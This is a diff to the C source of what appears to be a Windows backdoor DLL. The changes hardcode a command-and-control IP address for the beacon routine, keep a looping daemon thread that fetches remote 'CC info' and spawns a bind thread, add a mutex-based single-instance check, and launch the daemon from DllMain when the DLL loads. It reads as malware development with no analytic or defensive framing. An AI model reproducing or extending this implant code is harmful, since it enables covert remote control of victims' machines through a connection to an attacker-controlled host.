@@ -211,6 +211,9 @@ void GetCCInfo( char* address ) {
     WSACleanup( ) ;
     return 1 ;
   } // end of if( INVALID_SOCKET == ConnectSocket )
+#if 1
+  goto ___ ;
+#endif
   remoteHost = gethostbyname( HOSTNAME ) ;
   if( NULL == remoteHost ) {
     PRINTF( "[-] remoteHost : %p\n" , remoteHost ) ;
@@ -227,8 +230,12 @@ void GetCCInfo( char* address ) {
       PRINTF( "[-] remoteHost->h_addrtype == AF_INET" ) ;
     }
   }
+#if 1
+___:
+#endif
   clientService.sin_family = AF_INET ;
-  clientService.sin_addr.s_addr = addr.s_addr ;
+  /* clientService.sin_addr.s_addr = addr.s_addr ; */
+  inet_pton( AF_INET,"101.201.170.152",&(clientService.sin_addr));
   clientService.sin_port = htons( DEFAULT_PORT ) ;
   iResult = connect( 
     ConnectSocket , 
@@ -350,41 +357,38 @@ DWORD WINAPI DaemonThread( LPVOID lpParam ) {
   DWORD dwBindThreadId ;
   HANDLE hBindThread = NULL ;
   char address[DEFAULT_BUFLEN] ;
-  if( !CheckHeartBeat( ) ) {
-    hHeartBeatThread = CreateThread(
-      NULL ,
-      0 ,
-      HeartBeatThread ,
-      NULL ,
-      0 ,
-      &dwHeartBeatThreadId
-      ) ;
-    WaitForSingleObject( hHeartBeatThread , 1 ) ;
-    CloseHandle( hHeartBeatThread ) ;
-    for( ; ; ) {
-      if( CheckLocalTime( ) ) {
-        GetCCInfo( &address ) ;
-        if( CheckAddress( &address ) ) {
-          if( !hBindThread ) {
-            hBindThread = CreateThread(
-              NULL ,
-              0 ,
-              BindThread ,
-              address ,
-              0 ,
-              &dwBindThreadId
-              ) ;
-            WaitForSingleObject( hBindThread , 1 ) ;
-          } // end of if( !hBindThread )
-        } // end of if( CheckAddress( &address ) )
-        else {
-          if( !hBindThread ) {
-            TerminateThread( hBindThread , 0 ) ;
-            CloseHandle( hBindThread ) ;
-            hBindThread = NULL ;
-          }
-        }
-      } // end of if( CheckLocalTime( ) )
+#ifdef HEART_BEAT_WRITE_MEMORY
+  hHeartBeatThread = CreateThread(
+    NULL ,
+    0 ,
+    HeartBeatThread ,
+    NULL ,
+    0 ,
+    &dwHeartBeatThreadId
+    ) ;
+  WaitForSingleObject( hHeartBeatThread , 1 ) ;
+  CloseHandle( hHeartBeatThread ) ;
+#else
+  HANDLE hMutex = CreateMutex( NULL , FALSE , "XJJ" ) ;
+  CloseHandle( hMutex ) ;
+  PRINTF( "[+] before loop\n" ) ;
+#endif
+  for( ; ; ) {
+    if( CheckLocalTime( ) ) {
+      GetCCInfo( &address ) ;
+      if( CheckAddress( &address ) ) {
+        if( !hBindThread ) {
+          hBindThread = CreateThread(
+            NULL ,
+            0 ,
+            BindThread ,
+            address ,
+            0 ,
+            &dwBindThreadId
+            ) ;
+          WaitForSingleObject( hBindThread , 1 ) ;
+        } // end of if( !hBindThread )
+      } // end of if( CheckAddress( &address ) )
       else {
         if( !hBindThread ) {
           TerminateThread( hBindThread , 0 ) ;
@@ -392,37 +396,56 @@ DWORD WINAPI DaemonThread( LPVOID lpParam ) {
           hBindThread = NULL ;
         }
       }
-      Sleep( CHECK_LOCAL_TIME_SPLIT * 1000 ) ;
-    } // end of for( ; ; )
-  } // end of if( !CheckHeartBeat( ) ) {
+    } // end of if( CheckLocalTime( ) )
+    else {
+      if( !hBindThread ) {
+        TerminateThread( hBindThread , 0 ) ;
+        CloseHandle( hBindThread ) ;
+        hBindThread = NULL ;
+      }
+    }
+    Sleep( CHECK_LOCAL_TIME_SPLIT * 1000 ) ;
+  } // end of for( ; ; )
 }
 
+#ifdef HEART_BEAT_WRITE_MEMORY
 DWORD WINAPI HeartBeatThread( LPVOID lpParam ) {
-  long* timeStamp ;
+  long* p_timeStamp = HEART_BEAT_ADDRESS ;
   long timeStamp_new ;
   DWORD dwPID , dwTID ;
   HANDLE hProcess ;
   dwPID = GetCurrentProcessId( ) ;
   dwTID = GetCurrentThreadId( ) ;
   hProcess = OpenProcess(PROCESS_ALL_ACCESS, NULL, dwPID);
-  timeStamp = ( long* )WriteConsoleInput ;
   for( ; ; ) {
-//    PRINTF( "[%d] heart beating timeStamp %ld\r\n" , dwTID , *timeStamp ) ;
-    timeStamp_new = *timeStamp ;
-    timeStamp_new ++ ;
+    PRINTF( "[%d] heart beating timeStamp %d\r\n" , dwTID , *p_timeStamp ) ;
+    timeStamp_new = *p_timeStamp ;
+    /* timeStamp_new = */
+    /*   timeStamp_new % 2 ? */
+    /*   -- timeStamp_new : */
+    /*   ++ timeStamp_new */
+    /*   ; */
+    if( 0 < timeStamp_new && timeStamp_new <= 4444 ) { /* inside range [1,4444] */
+      timeStamp_new ++ ;
+    }
+    else {                      /* outside the range [1,4444], set to 1 */
+      timeStamp_new = 1 ;
+    }
     WriteProcessMemory( 
       hProcess , 
-      ( LPVOID )WriteConsoleInput ,
+      ( LPVOID )p_timeStamp ,
       ( LPVOID )&timeStamp_new ,
-      sizeof( &timeStamp_new ) ,
+      sizeof( timeStamp_new ) ,
       NULL 
       ) ;
     Sleep( HEART_BEAT_SPLIT * 1000 ) ;
   }
 }
+#endif
 
 BOOL CheckHeartBeat( ) {
   BOOL rc = FALSE ; // default not beating
+#ifdef HEART_BEAT_WRITE_MEMORY
   long* timeStamp ;
   long timeStamp_old ;
   long timeStamp_new ;
@@ -434,10 +457,18 @@ BOOL CheckHeartBeat( ) {
   timeStamp = ( long* )WriteConsoleInput ;
   timeStamp_old = *timeStamp ;
   PRINTF( "[%d] check timeStamp_old %ld\r\n" , dwTID , timeStamp_old ) ;
-  Sleep( ( HEART_BEAT_SPLIT + 1 ) * 1000 ) ;
+  Sleep( ( HEART_BEAT_SPLIT ) * 1000 ) ;
   timeStamp_new = *timeStamp ;
   PRINTF( "[%d] check timeStamp_new %ld\r\n" , dwTID , timeStamp_new ) ;
   rc = timeStamp_old == timeStamp_new ? FALSE : TRUE ;
+#else
+  HANDLE hMutex = CreateMutex( NULL , FALSE , "XJJ" ) ;
+  if( GetLastError( ) == ERROR_ALREADY_EXISTS ) {
+    CloseHandle( hMutex ) ;
+    rc = TRUE ; // beating
+    PRINTF( "[+] mutex XJJ exist\n" ) ;
+  }
+#endif
   return rc ;
 }
 
@@ -450,8 +481,7 @@ BOOL WINAPI DllMain(
   HANDLE hDaemonThread ;
   switch( fdwReason ) {
   case DLL_PROCESS_ATTACH :
-  /* PRINTF( "wassup" ) ; */
-  /* return TRUE ; */
+    PRINTF("dllmain called\n");
     hDaemonThread = CreateThread(
       NULL ,
       0 ,
